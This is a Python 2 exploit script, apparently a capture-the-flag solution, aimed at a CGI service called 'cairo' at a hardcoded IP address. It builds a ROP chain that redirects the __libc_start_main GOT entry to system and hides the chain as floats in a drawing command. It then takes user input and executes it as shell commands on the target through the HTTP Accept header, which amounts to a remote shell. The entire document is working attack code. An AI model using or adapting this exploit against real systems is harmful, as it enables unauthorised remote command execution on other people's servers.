#!/usr/bin/env python2
import time
import struct
import socket
import sys

"""
gadgets:
0x0000000000401101 : add dword ptr [rbx], ebp ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000401c6c : pop rbx ; pop rbp ; ret
0x0000000000401cd3 : pop rdi ; ret
0x0000000000401cd1 : pop rsi ; pop r15 ; ret

got:
0000000000603040 off_603040      dq offset __libc_start_main


"""
libc_start_main = 0x21dd0
libc_system = 0x46530

libc_start_main = 0x21dd0
libc_system = 0x44b30 

got_addr = 0x0000000000603040
data_addr = 0x603140
data_orig_content = """
09 1D 40 00 00 00 00 00  90 11 40 00 00 00 00 00
0E 1D 40 00 00 00 00 00  10 11 40 00 00 00 00 00
19 1D 40 00 00 00 00 00  C0 12 40 00 00 00 00 00
15 1D 40 00 00 00 00 00  70 13 40 00 00 00 00 00
25 1D 40 00 00 00 00 00
""".replace(" ", "").replace("\n","").decode("hex")

gadget_pop_rbx_rbp = 0x0000000000401c6c
gadget_pop_rdi = 0x0000000000401cd3
gadget_add = 0x0000000000401101

def do_rop(*args):
	global ropchain
	ropchain += struct.pack("Q"*len(args), *args)
def do_pop_rbx_rbp(rbx, rbp):
	do_rop(gadget_pop_rbx_rbp, rbx, rbp)
def do_pop_rdi(rdi):
	do_rop(gadget_pop_rdi, rdi)
def do_add(addr, val):
	val &= 0xffffffff
	do_pop_rbx_rbp(addr, val)
	do_rop(gadget_add, 0, 0, 0)

orig_wanted_cmd = "$HTTP_ACCEPT\x00"

def uint32_to_float(bytes_):
	tmp = struct.unpack("f", bytes_)[0]
	if struct.pack("f", tmp) != bytes_:
		#print bytes_.encode("hex")
		return None
	return tmp

num_spaces = 0
while 1:
	wanted_cmd = (" " * num_spaces) + orig_wanted_cmd
	wanted_cmd = wanted_cmd.ljust(len(data_orig_content), "\x00")
	assert(len(wanted_cmd) == len(data_orig_content))

	wanted_cmd = struct.unpack("I" * (len(wanted_cmd) / 4), wanted_cmd)
	data_orig_content_ints = struct.unpack("I" * (len(data_orig_content) / 4), data_orig_content)
	cmd_diffs = [(i - j) for i,j in zip(wanted_cmd, data_orig_content_ints)]

	ropchain = ""
	for i in xrange(len(data_orig_content_ints) / 4):
		do_add(data_addr + (i * 4), cmd_diffs[i])
	do_add(got_addr, libc_system - libc_start_main)
	do_pop_rdi(data_addr)
	do_rop(0x400d10) #call the got entry
	#print ropchain.encode("hex")

	floats = ""
	for i in xrange(len(ropchain) / 4):
		data = ropchain[i*4:][:4]
		tmp = uint32_to_float(data)
		if tmp is None:
			break
		tmp = "%.200f" % tmp
		if struct.pack("f", float(tmp)) != data:
			break
		tmp = tmp.rstrip("0")
		if tmp[-1] == ".":
			tmp += "0"
		floats += " " + tmp
	else:
		break
	num_spaces += 1

host = "188.40.18.72"#27.0.0.1"
while 1:
	command = raw_input()
	s = socket.socket()
	s.connect((host, 8000))
	http_request_body = "line_to 0 0 0 0 0 0 0 0 0 0" + floats
	http_request = "\r\n".join((
	"POST /cgi-bin/cairo?%d HTTP/1.0" % time.time(),
	"Accept: " + command,
	"X-Requested-With: XMLHttpRequest",
	"User-Agent: exploit",
	"Accept-Encoding: identity",
	"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
	"Accept-Language: en-US,en;q=0.8,de;q=0.6",
	"Host: %s:8000" % host,
	"Connection: close",
	"Content-Length: %d" % len(http_request_body),
	"",
	http_request_body
	))

	s.sendall(http_request)
	d = ""
	while 1:
		c = s.recv(4096)
		if not c:
			break
		d += c
	d = d.split("\r\n\r\n", 1)[-1]
	sys.stdout.write(d)
	sys.stdout.flush()
